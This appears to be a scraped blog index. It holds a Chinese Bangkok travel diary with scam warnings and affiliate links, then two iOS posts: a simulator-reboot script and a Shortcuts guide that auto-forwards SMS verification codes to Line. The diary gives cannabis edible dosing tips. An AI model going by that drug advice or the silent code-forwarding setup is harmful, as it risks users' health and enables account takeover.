300/人。臥佛寺裡的彩色舍利塔有一種說不出的壯觀感。 上次去日本九州也去 南藏院看臥佛 ，這次來看泰國的臥佛。 ⚠️人多地方，小心扒手⚠️進入需拖鞋、臥佛寺臥佛可以繞一圈參拜。SuperRich 換錢出臥佛寺之後想說先解決換錢問題，同行只有一位朋友有事先換一些泰銖，其他人都想說來曼谷再換；所以出來後就先走到附近的 The Old Siam Shopping Plaza⁩ 裡面的 SuperRich 換錢。⚠️請注意：要換的台幣不能有污漬、註記. .等等，否則會被拒絕兌換。(剛好有一張在台灣 ATM 領的千元大鈔上面有鉛筆註記被拒絕兌換) NTD $5,000 換到 THB $5,200Khanom bueang 泰式煎餅換完錢，有錢了，就在一樓的美食市集補充一下體能；吃了泰式煎餅 (ขนมเบื้อง) 甜的，裡面是蛋白霜吃起來很甜很像棉花糖、還有香蕉煎餅；最後買了一杯滿冰咖啡繼續前進。大皇宮、玉佛寺門票：THB 500/人。 👉👉👉KKday 有提供： 大皇宮和玉佛寺導覽之旅 (英語、泰語、中文、日語) ，想要更了解歷史的朋友可以考慮。一路走回大皇宮(玉佛寺在大皇宮內)，路上有很多政府機關的建築。大皇宮進入有服裝規定，要特別注意！ 不能穿短褲、露肩衣服、破洞牛仔褲、七分褲、短裙…等等 ⚠️人多地方，小心扒手⚠️夜叉門神夜叉和猴子樂達納舍利塔《拉瑪堅》壁畫圖片來源：Trueplookpanya ⚠️玉佛禁止拍照⚠️ 每個季節的服裝會有所不同，這次看到的是第二種服飾。大皇宮13:20 午餐時間大約來到 13 點多，出大皇宮後在附近往碼頭方向的西餐廳隨地解決午飯。14:00 準備搭船前往鄭王廟 ⚠️碼頭外邊會有人拉人問你去哪，要小心是私人船家，收費貴 (THB 500, 1000) 又不安全；無須理會，自己找到官方的碼頭、櫃檯跟他說你要去哪就好。⚠️ 官方的票價才 THB 30 ( Tha Chang 到 鄭王廟)，新的船有冷氣、安全又舒服。船到了，工作人員會喊到鄭王廟(沒錯就是中文)，不確定也可以隨時問。這時間快要下午後雷陣雨了，可以看得出來水流混濁湍急。船很新、冷氣很涼、封閉式的很安全、班次也蠻多的很方便！到站工作人員同樣會喊鄭王廟。14:30 抵達鄭王廟門票：THB 200下船後就是鄭王廟，可以直接排隊買票進入。 ⚠️鄭王廟同樣有服裝規定️⚠️ 不可以露肩、短褲、露肚、短裙。 可以穿泰服，很多人穿泰服來拍照。可以走到中間的平台拍照(⚠️樓梯很陡要小心)，很多人也會換泰服在此拍照留念。 👉👉👉 KKday 體驗推薦: - 曼谷鄭王廟攝影之旅的泰國服飾體驗 - 臥佛寺和鄭王廟 3 小時徒步導覽遊參觀完再回到碼頭先找到售票亭(PIER 2) 買前往 ICONSIAM 的船票 (THB 40)，再前往 PIER 1 搭乘。同樣也是舒服又安全的新船！15:00 ICONSIAMICONSIAM 很大，看起來也很奢華，一樓美食街很有特色。買一杯 ChaTraMue 手標泰奶補充體力。一路往後逛到 BTS Charoen Nakhon 月台，想說先去按個一小時腳底按摩。站外就有一家看起來比較新、大間的 (1) THAI GARDEN MASSAGE，問完沒位子；所幸繼續往前走到 (2) 另外一家，如圖位子的按摩店；我覺得也很舒服、人少、空間大、比較安靜，收費便宜 (腳/1小時/THB 270)。按完又有體力繼續逛街了，回到 ICONSIAM；一路走到樓上的餐廳，也是弄的很浮誇，有叢林、有小橋流水、有瀑布，整體很不錯！ 買了日本有名的薯條 TORO FRIES (排隊很長) 補充體力。 這邊也有日本的 % 咖啡。前往 LHAO LHAO 赴約吃飯這條是支線只有三站，班次比較少。 Google Map 好像沒有這條 BTS 的資訊，他是建議我用走的到 Krung Thon Buri。從這邊搭一站去 Krung Thon Buri 就是 Silom Line 了。曼谷也有 LAWSON!在 Siam 換 Sukhumvit Line 到 Ari 站下車走一小段就是 LHAO LHAO 餐廳了。19:00 LHAO LHAO老闆好像是華人(中國人)?，感覺像融合中式的泰式料理店，評價很高的老店，貌似也是 Blackpink LISA 愛店。因為等下要去 Pub 聽 Live 所以吃得比較趕，但每道菜我都覺得很好吃！！ 上圖1–3，鵝牌清涼膏的背景，像肉燥的那個，叫 หมูสับผัดหนำเลี้ยบ，好像是橄欖菜炒碎肉?，很下飯就是了！ 上圖2–1，炸蚵仔煎，類似台灣士林夜市的炸彈蚵仔煎 上圖2–2，季節限定飲品，龍眼茶 上圖2–3，最特別的咖哩螃蟹(Panang Curry)，是一整隻新鮮大螃蟹下去料理的 泰國人推薦的鵝牌清涼膏，我後來有買一罐聞起來比薄荷鼻通棒還順暢而且比較沒有鼻腔的刺激不適感！20:00 The Rock Pub吃飽後前往 The Rock Pub 喝酒、聽 Live。當天活動：https://www.instagram.com/p/C91ZVwtxR32/Rundown:• 20.00-21.00: A LIKELY LAD(Kings Of Leon/Blur/Arcade Fire and more)• 21.15-22.15: COUNTING DUCKS(Radiohead/The Strokes/The Killers and more)• 22.30-00.00 : THE CHOCOLATE COSMOS(Arctic Monkeys/Joy Division/The Cure/The Smiths and more)• 00.15-01.15: LIAM FT. HENSHIN(Oasis and more)價格：THB 350 附一杯飲料(酒)， 需提前買票預約 。 學到一個泰國冷知識：拍照不能拍酒標，因為會變有意鼓勵飲酒，所以要如圖 3 把酒標遮起來。四組表演，全都是搖滾、老歌經典！我聽過的有： Coldplay, Radiohead, Kings of Leon, Arcade Fire, Oasis, The Killers….我們大約聽到 23:00 時間太晚就先離開了，整場聽下來非常有水準！不管是唱功或是現場演唱的功力，我覺得很讚！很厲害！回飯店給 Chun-Hsiu Liu 台灣伴手禮之後解散回去休息了。8/04 Day 3 洽圖洽市集、王權瑪哈納功大廈、Central Rama 99:30 早餐：王春盛牛肉火鍋，牛雜火鍋吸貓體質，曼谷很多貓貓，馬上來蹭我一早坐 Grab 來 王春盛牛肉火鍋 吃早餐，整體味道蠻中/台式的，我覺得不錯，但台南牛肉湯更不錯。 吃完要去洽圖洽市集，洽圖洽的位置比較遠，懶得走路＋轉 BTS 去了，直接坐 Uber 前往 (THB 374)。 👉👉👉 KKday 恰圖恰市場 |曼谷私人接送服務10:45 抵達洽圖洽市集洽圖洽電子地圖 (chatuchak market map)點我洽圖洽整個範圍大、攤販密集，但整體乾淨好逛，但東西重複性質高，看起來很多就是賣觀光客的 Made In China 製品。最後只買了泰國品牌、泰國 Phutawan普妲旺 室內擴香，當紀念品。逛累了就走進裡面的按摩店腳底+一些肩頸按摩。(1 小時/THB 250)廁所洽圖洽如果要上廁所，市集外圍有付費廁所 (THB 5 一次)，我有進去上，很乾淨，一個人一格，基本上隨時都在打掃；不想付費上廁所也可以到外圍的 Mixt Chatuchak 商場，有免費、同樣乾淨的廁所。Mixt Chatuchak海鮮飯午餐也隨意在 Mixt Chatuchak 商場裡的餐廳隨便解決，味道還不錯。吃完繼續逛，買了一杯榴槤果汁來喝，味道很濃郁真實而且價格實惠 (THB 89)。 後來發現洽圖洽的東西其實比較便宜，例如薄荷鼻通棒這邊賣 6 支 $99，Big C 賣 6 支 $140…還有榴蓮果汁也是，市區夜市賣一杯 $140 多。15:00 搭 BTS 前往 王權瑪哈納功大廈洽圖洽離 MRT 比較近，但我們要去的王權大夏就在 BTS Chong Nonsi 站；從洽圖洽走到最近的 BTS Saphan Khwai 站大概要 1 KM (15 mins)。王權瑪哈納功大廈 (曼谷大京都大廈/King Power Mahanakhon)門票：THB 1,080/人 👉👉👉 推薦可以先從 KKday 買門票，價格較便宜：曼谷王權 Mahanakhon SkyWalk 觀景台門票 (2 天前可免費取消)近看沒有想像中高聳，但是建築風格很特別，比特賽博風。進去要先安全檢查，買完票會附送免費寄物，背包類不能攜帶上去(小腰包可以)。 搭電梯前可選擇要不要拍照 (門票含一系列免費合成的數位照片，如果要實體照片要再加錢)。免費合成的數位照片，參觀完電梯下來會有工作人員指引下載直達電梯跟台北 101、晴空塔一樣有 360 度場景動畫；高度上大約跟東京鐵塔差不多。電梯上來會先到 74 樓室內觀景台，這邊有一家咖啡廳跟公共座位可以稍做休息；要繼續轉乘電梯或走樓梯上到 78 樓才是頂樓戶外觀景台。78 樓一上來就有一家小的酒吧，也可以在這邊點一杯酒坐著觀賞景觀。出來 78 樓後可以繼續往上走來到階梯、頂樓休息區。頂樓可以環視整個曼谷，可以想像晚上的夜景應該也很美！階梯、頂樓休息區面對的就是有名的透明玻璃走廊，可以直接垂直看到地面，自己從旁邊箱子拿鞋套就可以進場、但 禁止攜待手機，可以請同行的人或工作人員協助拍照。整個玻璃走廊沒有很大，大概就像飯店的頂樓天際游泳池的大小而已，在旁邊看沒有覺得很高，實際走上去還是會怕，有點腳軟ＸＤ喬德夜市 (原拉差達火車夜)MRT 可以直接刷信用卡要到 Central Rama 9 需要轉搭 MRT 地下鐵到 帕藍9站，無法使用兔子卡，要買票或是現在可以用 VISA 卡直接刷卡進出。 實測台新 GoGo 卡可以，國泰 Cube 沒刷過。晚餐來這邊覓食，不得不說曼谷的夜市、市集贏台灣太多了，整體環境乾淨、有座位區、不會混亂、規劃良好，逛起來很舒服。逛了一圈先吃了左邊的甜點(類似雞蛋糕?)，跟右邊鹹的海鮮燒，吃起來是 QQ 的，都還不錯。再來是重頭戲火山排骨，味道蠻特別的，醬汁是香茅酸辣味道，直接套手套徒手抓起來啃，很開胃！吃完又在其他攤買了椰子冰淇淋+芒果+花生甜點，也好吃！吃完回 Central Rama 9 逛一下，這邊也有有名的 NaRaYa 曼谷包。回飯店的路上剛好遇到下完雨的曼谷配上五彩斑斕的數位廣告螢幕，色彩對比值直接拉滿，很有賽博龐克感。7–11 熱壓吐司宵夜回飯店路上去超商試了泰國的 超商熱壓吐司 還有泰國的香蕉牛奶，內餡是融化的起司熱狗，皮是酥皮！皮是酥皮！皮是酥皮！，很好吃而且便宜！8/05 Day 4 Central World、Big C、Terminal 21 整晚沒睡好＋整天宿醉，迷迷茫茫。Central World早上起來就出門到 Central World 逛街。一樓進來就有 SHAKE SHACK 漢堡，第一次吃直接點 SHAKE SHACK 招牌跟曼谷才有的椰奶口味奶昔，漢堡好吃不膩、奶昔我覺得太甜。裡面很大，跟 ICONSIAM 一樣樣要認真逛的話逛不完…走馬看花，隨手買了一件襯衫而已。Big CCentral World 逛完就走到對面 Big C 採買零食、伴手禮。(選項多但我覺得沒比較便宜…)左下 Phutawan普妲旺 室內擴香是昨天在洽圖洽買的，但我猜市區的百貨公司也有。另外 Big C 現在好像不提供塑膠袋，要自己在賣場裡買環保袋。 那個榴槤乾一大包，打開其實只有兩小包喔…不過蠻好吃的午餐Central World 外廣場有美食市集活動，不是單純搭搭棚子擺擺攤而已，他是有主體的，這次主題是鐵達尼號，只要追蹤他們官方的 Youtube 頻道就可以免費入場；裡面也佈置的很精緻。但午餐我們又跑去吃了一次 SHAKE SHACK，這次換吃雞腿肉漢堡，同樣好吃。下午：回飯店補眠，因為沒睡好＋宿醉…實在太累了晚餐 Terminal 21 航站百貨Terminal 21 也是要逛逛不完，每一層都有不同地區主題，例如日本就是主要賣日本的商品、餐廳。主要是跟 Chun-Hsiu Liu 約樓上美食街吃完餐。( 便宜又好吃，激推的覓食地點 )美食街這邊就自己找位子坐，很多當地人也會來吃。 ⚠️ 這邊的消費方式，店家不直接收錢，要先去櫃檯用現金換食物卡，憑食物卡 QRCode 結帳付款；吃完再回到櫃檯歸還、退款。(不需押金、手續費)選擇蠻多的，只要排隊、說你要的號碼、食物卡 QRCode 結帳即可；也可以外帶(我記得要多收 THB 10 包裝費)。點了海鮮炒泡麵(THB 50) + 豬排薯條 (THB 59) = THB 109吃完還外帶一盒芒果糯米飯當宵夜回飯店吃。真的很吃又便宜啊！！！前幾天吃外面餐廳一餐其實也要 200–300 起跳，這邊幾乎都是 THB 50~80 一餐。吃完跑去後面的 班嘉奇蒂公園 走走，順便找傳說中的 曼谷大蜥蜴 ；可能因為晚上的關係，一隻都沒看到。 ⚠️回飯店的路上遇上傳說中的外國人詐騙：⚠️ 在月台等 BTS 的時候… 看起像中東的人，上來搭訕 - 問你是不是泰國人、問你會不會英文、然後問你從哪裡來 - 我說 Taiwan - 他就負荷說 Oh. . Taiwan, I love Taiwan 但從他的發音就知道他根本不知道台灣… - 然後就說他要換錢但 SuperRich 關了，問我一百美金能換多少泰銖 我就覺得怪怪的了，直接不鳥他走人… 他們的手法都差不多，不然就是問你國家的貨幣長怎樣，他好奇可以給他看看嗎，然後趁你拿錢包的時候扒你的錢或是搶你的錢然後落跑。回飯店，同行友人有買山竹來品嚐，我覺得新鮮的好吃，淡淡的甜味加上山竹的味道，很順口，後來有吃山竹乾，味道就不怎麼樣，就乾乾酸酸的。 榴槤的部分，曼谷的榴蓮沒有比較便宜…一房也都 THB 200 – 300。8/06 Day 5 回程曼谷大蜥蜴早上不死心，特別去 倫批尼公園 找傳說中的曼谷大蜥蜴，因為時間不夠只找到一隻早上剛出來曬太陽的中型蜥蜴。 找大蜥蜴只是我個人無聊的行程，據說本地人很討厭這種蜥蜴(水巨蜥)，吃的東西也很髒，不要隨便接觸。12:00 回飯店拿行李前往機場15:20 的飛機，中午就要出發了，從市區到機場約需一個小時。 👉👉👉可以參考 KKday 機場接送服務： - 泰國｜機場包車接送｜素萬那普機場(BKK) / 廊曼機場 (DMK) — 曼谷/芭達雅/華欣市區飯店 - 曼谷機場接送｜曼谷市區私人包車至素萬那普機場(BKK)/廊曼機場(DMK)從飯店出發 Grab 車資：THB 577，需要上高速；司機會先代付過路費，最後 Grab 刷卡車資會再補上過路費。(我記得好像 THB 50)托運只能 15 kg，很克制的守住了。BKK 夜叉門神。出境完大約 13:20，曼谷機場檢查蠻嚴格的，所有東西都要過安檢，登機箱幾乎都要打開人工檢查。出境、安檢完，大概還有一小時可以吃東西；找了間泰式餐廳吃了泰國的最後一餐。(海鮮炒飯、芒果汁、芒果糯米飯)。 芒果糯米飯出境後很多店家都有賣外帶盒，吃不夠還可以買上飛機吃！ (⚠️但切記禁止帶回台灣⚠️)這瓶水質得給他一張特寫，因為廉航什麼都沒供應想說在機場買水上去喝，但是出境後的礦泉水一瓶都要 THB 70 — 100，這瓶要 THB 100。BKK 很大…滿滿的 Trip.com 廣告，回程沒有誤點時間到就搭接駁車去搭機了。回到台灣到 TPE 台灣桃園國際機場，領完行李出來後約 20:45，直接去搭 1841 or 1819 國光客運回台北，不需轉來轉去很方便～⚠️泰國曼谷旅遊安全及注意事項⚠️出門最重要的事就是安全，這邊統一整理安全及注意事項。防騙/防坑以下參考總結自曼谷貓大大的影片，我這次遇到的換/看錢詐騙就真的遇到了。 算錯帳不一定是故意，可以點餐的時候就算好總共金額 主動搭訕你想看你國家的貨幣或問你換錢等你把錢包掏出來時，偷或扒或搶 在大皇宮或景點外謊稱景點關門，熱心介紹你搭嘟嘟車去其他(黑寺廟/黑商店/ 坐私人遊船黑船，這次在碼頭有遇到 )地方騙你消費 嘟嘟車，漫天喊價、到一半突然加價如果想體驗嘟嘟車又怕被宰， 可以試試看新的 MUVMI app 嘟嘟車叫車 App 就算是看起來好的嘟嘟車，也要防範騙局 3，熱心介紹你去景點、坐船 假店員，在排隊候位時，會有假店員熱情招攬你們進去會用你的語言介紹餐點、幫你點餐，然後說要先結帳，拿了錢就跑了。 租機車、租摩托車騙局勿壓護照、勿壓護照、勿壓護照如果遇到惡意坑殺說損壞要你賠償的，壓護照就麻煩了或找大間的連鎖租賃商家、租車前也要先拍好車況影片 當地交友軟體騙局可能約到人妖、仙人跳、騙子 帕蓬乒乓秀騙局，路上熱情攬客問你要不要看乒乓 Show，只要點一杯 100 THB 酒就可以，然後帶你進暗巷、二樓黑店。很難看，要離開的時候跟你要 3,000 THB，說沒有 100 THB 這回事。 人多就要小心扒手，即使是在要買票才進去的地方 (e.g. 大皇宮、臥佛寺)🌿🚬明年就要禁止了，不過可以分享一下經驗。 ⚠️⚠️⚠️用吃的(軟糖之類)效果很強，而且可怕的是吃的時候真的就跟一般軟糖一樣毫無感覺，會在幾個小時後突然衝起來發作⚠️⚠️⚠️ 最好漸進式嘗試，吃 1/3 . .等幾小時. .沒事、再吃 2/3 . .等幾小時. .有一點感覺、再試試看吃 1 顆… 抽的也是看體質最好也是漸進式 ⚠️⚠️⚠️不管怎樣強烈建議都在飯店內嘗試，如果茫了可以直接休息，比較安全⚠️⚠️⚠️ 會喝酒不代表比較耐受 ⚠️⚠️⚠️ 心跳會加速不舒服 ⚠️⚠️⚠️ 需要有一個人是醒著，有事能照顧，比較安全 只有在特定場合可以抽其他 泰國不是小費文化的國家，一般來說不用給；我只有按摩才會給 THB 20 小費意思意思一下。 會賣酒的時間只有 11:00~14:00、17:00~24:00，佛教節日全天禁止賣酒 飯店陽台不一定能吸菸，要問 外國人專用外國語緊急救助電話撥 1155 SuperRich 是有營業時間的，如果太早或太晚到就沒辦法換到錢附錄 — 2018 數字科技 曼谷華新 5日員工旅遊 純回憶跟一些行程給大家參考，細節不可考。數字科技 2018 年員工旅遊 ⚠️以下都是 2018 的照片跟紀錄，僅供參考⚠️ ⚠️以下都是 2018 的照片跟紀錄，僅供參考⚠️ ⚠️以下都是 2018 的照片跟紀錄，僅供參考⚠️Day1復活島摩艾巨石像咖啡館 Moai Cafe (已停業)同事(2024)也有說，曼谷有很多很多網美咖啡廳，都很浮誇，有興趣的朋友可以查查看，這家評價不高而且已歇業。晚餐 — Chom View Seafood 海景海鮮餐廳住 2 晚 — SHERATON HUA HIN RESORT &amp; SPA 華新喜來登Source: SHERATON HUA HIN RESORT &amp; SPA飯店照片沒拍幾張，只拍了一張早上醒來發現被子裡有一隻大馬陸的驚嚇照。Day 2Santorini Park 希臘風情小鎮 (已停業)好像是個小樂園、跟百貨公司，希臘造景。華新藝術村 Hua Hin Artist Village蠻有名的景點，2024 還有營業。有很多畫作、藝術品。回喜來登飯店享受設施、海灘飯店是 Villa 形式，每間都是獨棟，游泳池可以環繞整個飯店的每間房間，泳池旁就有酒吧；外面沙灘是未開發地區，一片荒蕪。晚上吃完飯點自助餐，去附近夜市逛逛。Day 3美功鐵道市場時間太早，大家放棄不去。丹嫩莎朵水上市場 👉👉👉 這兩個景點交通不方便，可參考 KKday 行程： - 曼谷經典一日遊｜美功鐵路和丹嫩莎朵水上市場 | 曼谷出發 -【泰國】曼谷包車半日遊｜美功鐵道市場 — 安帕瓦水上市場 — 安帕瓦螢火蟲遊河記得蠻刺激、有探險的感覺，雖然水很混濁跟有味道。前往曼谷 入住(2日) 皇后公園萬豪酒店 MARRIOTT QUEENS PARK BANGKOKHEALTH LAND 2 小時全身泰式按摩導遊特別跟店家說不踩背，只記得很高級，但是邊按會痛睡不著ＸＤRiver City Shopping Complex因為晚上要去昭披耶公主號郵輪+自助晚餐，所以先來到碼頭附近的百貨公司逛街。昭披耶公主號郵輪自助晚餐 👉👉👉 需要提前預訂，可以參考 KKday 的 昭披耶公主號郵輪自助晚餐｜Chao Phraya Princess River Cruise 。吃的我記得還行，主要是夜景很美，可以看到曼谷 河濱夜市摩天輪 的燈火。回飯店後到萬豪樓上的酒吧小酌，只記得夜景漂亮、酒便宜。Day 4 自由行只記得有去逛百貨公司、Big C、Central World。晚上去 曼谷薩通JC凱文酒店 Zoom Sky Bar 小酌 就是我這次去住的飯店ＸＤDay 5 回程以上就是 2018 員工旅遊的記憶，這次全自由行重返曼谷，讓我更熟悉了這個城市，相較之前來的印象我覺得比之前更繁華、東西更好吃、物價也比之前貴了。— — —香港人既Party Room / BBQ場平台 — Common Room預約平台Common Room無論你是想找個Party Room慶祝、還是要日租酒店/賓館短住，你都可以使用 Common Room平台，輕鬆去尋找你的心儀場地！現在更可以預約香港的船P呀。有要去香港旅遊的朋友，想嘗試不同場地的體驗，可以立即前往看看： Common Room 預約平台 。— — —👉👉👉KKday 方案推薦： 昭披耶公主號郵輪自助晚餐｜Chao Phraya Princess River Cruise 曼谷經典一日遊｜美功鐵路和丹嫩莎朵水上市場 | 曼谷出發 【泰國】曼谷包車半日遊｜美功鐵道市場 — 安帕瓦水上市場 — 安帕瓦螢火蟲遊河 曼谷王權 Mahanakhon SkyWalk 觀景台門票 泰國機場 BKK 出境 meet and greet 快速尊榮接待服務 泰國網卡｜AIS 5G高速網路 8日 無限流量+通話 eSIM 泰國｜機場包車接送｜素萬那普機場(BKK) / 廊曼機場 (DMK) — 曼谷/芭達雅/華欣市區飯店 曼谷機場接送｜曼谷市區私人包車至素萬那普機場(BKK)/廊曼機場(DMK) 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 981+ Followers 1,278 Total Views Last Statistics Date: 2025-01-19 | 1,146 Views on Medium. " }, { "title": "iOS TemporaryWorkaround for Black Launch Screen Bug After Several Launches", "url": "/posts/7584f643c0aa/", "categories": "ZRealm Dev.", "tags": "ios-app-development, xcode, simulator, bugs, apple", "date": "2024-08-20 23:32:04 +0800", "snippet": "[iOS] TemporaryWorkaround for Black Launch Screen Bug After Several Launches暫時 Workaround 解決 XCode Build &amp; Run App 卡黑屏問題Photo by Etienne Girardet問題不知道是 XCode 幾開始 (應該是 14?) 有些專案在 Build &amp; Run...", "content": "[iOS] TemporaryWorkaround for Black Launch Screen Bug After Several Launches暫時 Workaround 解決 XCode Build &amp; Run App 卡黑屏問題Photo by Etienne Girardet問題不知道是 XCode 幾開始 (應該是 14?) 有些專案在 Build &amp; Run 到模擬器多次之後會出現卡死在黑屏的問題，狀態卡在 Launching Application… 就沒有反映了；重新 Build &amp; Run 也沒用，需要手動砍掉整個模擬器讓他重啟才能修復。XCode 14.1: Stuck at “Launching Ap. . . | Apple Developer Forums Hello team, On Xcode 14.1, After building the project and when the simulator launches, it shows blank black screen… forums.developer.apple.com新專案、新的專案設定比較少遇到這問題；舊的專案比較常踩到，但舊專案礙於歷史悠久、設定複雜，查網路資料也查不到確定的 Root Caused，多半推測是 XCode Bug (or M1?)；但是這個問題實在太煩了，時常 Build &amp; Run 要看成果，結果一片黑暗，要整個重來過，每次大概要浪費個 1–2 分鐘，很中斷開發。Workaround這邊提供一個山不轉路轉的 Workaround，思路是既然避不開黑屏問題，並且黑屏不會出現在模擬器第一次啟動的 Build &amp; Run，所以我們只要確保每次 Build &amp; Run 都是全新重開過的模擬器即可。首先我們要取得你想要執行的模擬器的 Device UUID在 Terminal 執行：xcrun simctl list devices 找到你想用的模擬器裝置及它的 Device UUID 這邊以我的 iPhone 15 Pro (iOS 17.5) 為例Device UUID = 08C43D34–9BF0–42CF-B1B9–1E92838413CC再來我們新增一個 auto-reboot.sh Shell Script 檔案 cd /你想放此 Script 的目錄/ vi auto-reboot.sh貼上以下 Scirpt： 將 [Device UUID] 替代成你想用的模擬器 Device UUID 記得如果模擬器有更換要改這個腳本的 Device UUID，否則就無效了#!/bin/bash## Use the command below to find the Device UUID of the simulator you want to use:## xcrun simctl list devices# shutdown simulatorxcrun simctl shutdown [Device UUID]# reboot simulatorxcrun simctl boot [Device UUID] 腳本邏輯簡單粗暴，就是 關掉&amp;重啟 你想用的模擬器 ESC &amp; :wq!調整 auto-reboot.sh 執行權限：chmod +x auto-reboot.sh回 XCode 設定因為每個人習慣用的模擬器不同，因此我是設定在 XCode Behaviors，不會更動到專案的設定，也不會上到 git 影響團隊其他夥伴；但如果要簡單、全團隊同步也可以直接設定在 Scheme -&gt; Build -&gt; Pre-actions -&gt; sh /你想放此 Script 的目錄/auto-reboot.sh 。XCode Behaviors XCode -&gt; Behaviors -&gt; Edit Behaviors… 找到 Running 區塊 選擇 Completes 選項Completes 時機 = Stop or Rebuild 右邊勾選 Run 選擇 Choose Script… 選擇剛剛新建的 auto-reboot.sh 檔案位置 完成原理與結語Demo 是乾淨專案所以 Build 時間很短我們運用 XCode Behaviors 在 Completes (Stop or Rebuild) 的時機點重開模擬器，時間在開始 Build 之前，幾乎都能在 Build -&gt; Run 結束前完成重啟。如果狂按重開的確也有機會重啟太慢，導致 Run 找不到目標而出現另一種黑屏，不過這情況就不考慮了，至少這方案能在日常正常使用保持 Build &amp; Run App 正常執行。對速度的影響我覺得還好，因為 Build &amp; Run 本身也需要些時間，這些時間很夠模擬器重開了。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 75 Total Views Last Statistics Date: 2025-01-19 | 66 Views on Medium. " }, { "title": "iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項", "url": "/posts/309d0302877b/", "categories": "ZRealm Dev.", "tags": "ios-app-development, automation, rpa-solutions, shortcuts, ios", "date": "2024-08-19 23:56:48 +0800", "snippet": "iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項iOS 使用 捷徑 Shortcut 簡單幾個步驟自動轉發特定簡訊到 Line 和自動創建包裹到貨領取與信用卡繳費提醒代辦事項Photo by Jakub Żerdzicki背景捷徑 Shortcut (舊稱 Workflow) 是 iOS 12 開始的新功能；能自行建立一系列工作一鍵執行和設定自動在背景觸發執行。除了 iOS...", "content": "iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項iOS 使用 捷徑 Shortcut 簡單幾個步驟自動轉發特定簡訊到 Line 和自動創建包裹到貨領取與信用卡繳費提醒代辦事項Photo by Jakub Żerdzicki背景捷徑 Shortcut (舊稱 Workflow) 是 iOS 12 開始的新功能；能自行建立一系列工作一鍵執行和設定自動在背景觸發執行。除了 iOS 自帶 App 的捷徑功能，這幾年蘋果也將 Siri Shortcut / App Intents 開放給開發者，讓第三方 App 也能把部分功能放到捷徑中供使用者組合使用。自動執行條件的部分目前只限 iOS 自身或自家的 App，例如：特定時間、抵達、離開某個位置、感應到 NFC、收到訊息、電子郵件或連接上 Wi-Fi、電池電量、勿擾模式、偵測到聲音…等等蘋果自家的服務，不需要像早期轉發簡訊要越獄；捷徑功能，免越獄，免安裝奇怪的第三方 App。 網路上介紹捷徑如何使用、提供現成腳本的內容已經很多，本篇文章不多敘述。 iOS 的跨裝置訊息轉寄功能（設定 -&gt; 訊息 -&gt; 訊息轉寄）必須是同個 Apple ID 的裝置才行，因此我們要使用捷徑幫我們完成特定訊息轉寄。 本篇只介紹 3 個我覺得很實用方便又簡單的應用場景。場景 1 — 自動轉發簡訊在這個詐騙簡訊滿天飛的年代很怕家中長輩小孩收到詐騙簡訊不小心輸入資料被騙，或是長輩不懂收簡訊驗證這個帳號安全流程，需要遠端幫他收簡訊完成驗證；另外也怕小朋友用手機去做一些不允許的事。https://branch.taipower.com.tw/d112/xmdoc/cont?xsmsid=0M242581319225466606&amp;sid=0N209616847897374705效果設定條件如下： 當收到簡訊包含「http」時轉發訊息「內容」到 Line 給我 當收到簡訊包含「通知」時轉發訊息「內容」到 Line 給我 當收到簡訊包含「驗證碼」時轉發訊息「內容」到 Line 給我 當收到簡訊包含「認證碼」時轉發訊息「內容」到 Line 給我實測即使手機在未解鎖待命狀態也都能正確執行發送。設定方式1.安裝＆ 打開 捷徑 App2.切換到「自動化」頁籤，選擇右上角「+」，下滑找到「訊息」3. 設定訊息條件 「訊息包含」： http ( =有附網址的簡訊都會轉發 )多個關鍵字要個別建立多個捷徑。 「確認後執行」 改成 「立即執行」 點擊 「下一步」何時 — 其他設定： 「寄件人」：多個，但要加入到聯絡人 「訊息包含」、「寄件人」兩個條件需至少則一設定， 因此無法不設條件處理所有訊息4. 新增自動化操作 選擇 「新增空白的自動化操作」 如果想轉發到 Line 訊息則在搜尋匡輸入 「line」 搜尋 Line 提供的捷徑功能，找到 Line的 「傳送訊息」 選擇想傳送的目標 這邊如果只會出現最近四位對話對象或群組，如果沒有出現你要的目標，可以先回到 Line 上傳送幾則訊息給目標對象或群組，再回來看就會出現了。 對象選擇通訊錄電話號碼功能在 Line 傳送訊息無效。 同理，你也可以改用 「傳送訊息」 或 「發送電子郵件」 的動作(如第三張圖)，將收到的訊息內容轉發到簡訊(如果沒開 iCloud 訊息可能會被收取簡訊費用)或 Email。新增傳送對象後 先點擊 將「訊息」傳送給「XXX」 ，的 「訊息」 輸入匡 向右滑找到＆點擊 「捷徑輸入」 回到上方點擊 將 「捷徑輸入」傳送給「XXX」 ，的 「捷徑輸入」 輸入匡 跳出下方選單，將原本選擇的 「訊息」 改為 「內容」 點擊選單旁邊「X」關閉 點擊右上角「完成」 如果要更改傳送給 XXX 對象，要先點右邊 X 移除整個 Line 動作，然後再重新新增一次 Line 傳送訊息動作 with 新對象。 確認最終設定結果是：當我收到包含「XXX」的訊息時，將訊息作為輸入接收，Line 將「內容」傳送給「XXX」 沒問題點擊右上角「完成」如果點完成沒反應那可能是遇到 iOS Bug，可以不管他直接點返回回到首頁。 回到捷徑自動化首頁可以查看、暫停、修改這則捷徑。完成！只要坐等新簡訊進來，符合包含的關鍵字就會自動轉發(就算手機沒解鎖)，礙於目前功能限制，每個關鍵字都要建立一個捷徑，同個簡訊包含到不同關鍵字會發送兩次。場景 2 — 包裹送達超商時-自動建立提醒待辦事項我目前使用 Apple 內建的提醒事項當做生活事項的待辦管理工具，所以我也希望那些需要提醒我的事也能整合進去，例如包裹送達超商、信用卡繳費通知…等等效果設定條件如下： 當收到簡訊包含「已在」時新增提醒事項 (Coupang 是用「已在」) 